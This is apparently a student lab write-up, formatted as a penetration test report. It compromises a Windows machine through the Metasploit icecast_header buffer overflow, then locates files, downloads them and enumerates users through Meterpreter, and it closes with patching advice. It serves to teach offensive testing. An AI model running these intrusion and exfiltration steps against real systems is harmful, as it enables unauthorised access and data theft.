# PenTesting

# GoodSecurity Penetration Test Report 

taylorfletcher@GoodSecurity.com

June 30, 2021

# High-Level Summary

GoodSecurity was tasked with performing an internal penetration test on GoodCorp’s CEO, Hans Gruber. An internal penetration test is a dedicated attack against internally connected systems. The goal of this test is to perform attacks similar to those of a hacker and attempt to infiltrate Hans’ computer to determine if it is at risk. GoodSecurity’s overall objective was to exploit any vulnerable software, find a secret recipe file on Hans’ computer, and report the findings back to GoodCorp.
The internal penetration test found several alarming vulnerabilities on Hans’ computer: When performing the attacks, GoodSecurity was able to gain access to his machine and find the secret recipe file by exploiting two programs with major vulnerabilities. The details of the attack are below.

# Findings

## Machine IP:
`192.168.0.20`
## Hostname:
`MSEDGEWIN10`
## Vulnerability Exploited:
`icecast_header`
## Vulnerability Explanation:
By using the icecast_header exploit, an attacker can exploit a “buffer overflow” in an older version of icecast (2.0.1) which is a program that runs on Windows machines.  When 32 headers are sent via the exploit, one header will remain as a link between the target and the exploit.  You can hit with multiple different threads until the thread count is reached to maximize the efficiency of the attack.  Especially if the attacker has multiple scripts at the ready to exploit once the attacker is inside the victim machine. 

*Source: https://www.rapid7.com/db/modules/exploit/windows/http/icecast_header/*

## Severity:
This vulnerability is extremely severe. Thankfully, it can be mitigated easily by updating to the newer version of icecast.

## Proof of Concept:
 ### **Perform a service and version scan using Nmap to determine which services are up and running:** 
 - `nmap -A -sT 192.168.0.20`
   ![17 hw1.png](https://github.com/w0lfboy/PenTesting/blob/main/Images/17%20hw1.png)
   
 ### **From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:** 
 - `searchsploit icecast`
   ![17 hw2.png](https://github.com/w0lfboy/PenTesting/blob/main/Images/17%20hw2.png)
   
 ### **Now that we know which exploits are available to us, let's start Metasploit:** 
 - `msfconsole`
   ![17 hw3.png](https://github.com/w0lfboy/PenTesting/blob/main/Images/17%20hw3.png)
   
 ### **Search for the Icecast module and load it for use.** 
 - `search icecast`
   ![17 hw4.png](https://github.com/w0lfboy/PenTesting/blob/main/Images/17%20hw4.png)
 
 ### **Set the RHOST to the target machine.**
 - `set RHOST 192.168.0.20`
 
   ![17 hw5.png](https://github.com/w0lfboy/PenTesting/blob/main/Images/17%20hw5.png)
 
 ### **Run the Icecast exploit.**
 - `exploit`
   ![17 hw6.png](https://github.com/w0lfboy/PenTesting/blob/main/Images/17%20hw6.png)
 
 ### **Run the command that performs a search for the secretfile.txt on the target.**
 - `search -f *secretfile.txt`
 - *note: Make sure to be in the root directory. I also did not screenshot when I first ran the command above, so the screenship is from the finding of the file*
   ![17 hw7.png](https://github.com/w0lfboy/PenTesting/blob/main/Images/17%20hw7.PNG)
 
 ### **Run the command to performs a search for the recipe.txt on the target:**
 - `search -f *recipe.txt`
 - *note: the wildcard came in handy!  We could have used it at the end of the file too if we did not already know the file type we were looking for... i.e. 'passwords'*
   ![17 hw8.png](https://github.com/w0lfboy/PenTesting/blob/main/Images/17%20hw8.PNG)
   
 ### **Run the command that exfiltrates the recipe.txt file:**
 - `download Drinks.recipe.txt`
 - *note: the important part is to make sure you are actually in the directory that you are exfiltrating from!! Otherwise it will not work. :)*
   ![17 hw9.png](https://github.com/w0lfboy/PenTesting/blob/main/Images/17%20hw9.PNG)
   
 ### **You can also use Meterpreter's local exploit suggester to find possible exploits.**
 - `run post/mulit/recon/local_exploit_suggester`
   ![17 hw11.png](https://github.com/w0lfboy/PenTesting/blob/main/Images/17%20hw11.PNG)
   
 ### **Run a Meterpreter post script that enumerates all logged on users.**
 - `run post/windows/gather/enum_logged_on_users`
   ![17 hw10.png](https://github.com/w0lfboy/PenTesting/blob/main/Images/17%20hw10.PNG)
   
 ### **Open a Meterpreter shell and gather system information for the target.**
 - `shell`
   ![17 hw12.png](https://github.com/w0lfboy/PenTesting/blob/main/Images/17%20hw12.PNG)
   
 ### **Run the command that displays the target's computer system information:**
 - `sysinfo`
   ![17 hw13.png](https://github.com/w0lfboy/PenTesting/blob/main/Images/17%20hw13.PNG)
   
## Recommendations
 - I would immediately update icecast on all machines.  It is outdated and the cause of this vulnerability.  In the future, I would recommend having a routine update check in place so that machines can be frequently monitored for missing updates.





















